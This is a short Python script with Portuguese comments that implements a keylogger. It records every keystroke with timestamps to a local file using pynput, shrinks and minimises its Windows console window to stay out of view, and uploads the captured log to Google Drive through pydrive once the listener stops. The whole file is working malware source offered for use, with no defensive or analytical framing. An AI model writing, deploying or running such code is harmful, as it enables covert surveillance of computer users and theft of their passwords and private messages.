import os
import logging
from pynput.keyboard import Key, Listener
from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive

# Função para enviar arquivo ao Google Drive
def upload_to_drive(filename):
    gauth = GoogleAuth()
    gauth.LoadCredentialsFile("credentials.txt")  # Tenta carregar as credenciais existentes

    if gauth.credentials is None:
        gauth.LocalWebserverAuth()  # Autentica se não houver credenciais
    elif gauth.access_token_expired:
        gauth.Refresh()  # Atualiza o token se estiver expirado
    else:
        gauth.Authorize()

    gauth.SaveCredentialsFile("credentials.txt")  # Salva as credenciais para a próxima execução

    drive = GoogleDrive(gauth)

    # Criando um arquivo no Google Drive
    file_drive = drive.CreateFile({'title': filename})
    file_drive.SetContentFile(filename)
    file_drive.Upload()
    print("Arquivo carregado com sucesso!")

# Função para registrar teclas pressionadas
def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))

# Esconde o prompt (assumindo que está sendo executado no Windows)
os.system('mode con: cols=15 lines=1')
os.system('color 0F')
os.system("start /min")

# Configura o log para salvar as teclas pressionadas em "teclas_log.txt"
logging.basicConfig(filename=("teclas_log.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Inicia o keylogger
with Listener(on_press=on_press) as listener:
    listener.join()

# Quando o keylogger for encerrado (por exemplo, se você encerrar manualmente o programa),
# ele enviará o arquivo "teclas_log.txt" para o Google Drive.
upload_to_drive("teclas_log.txt")
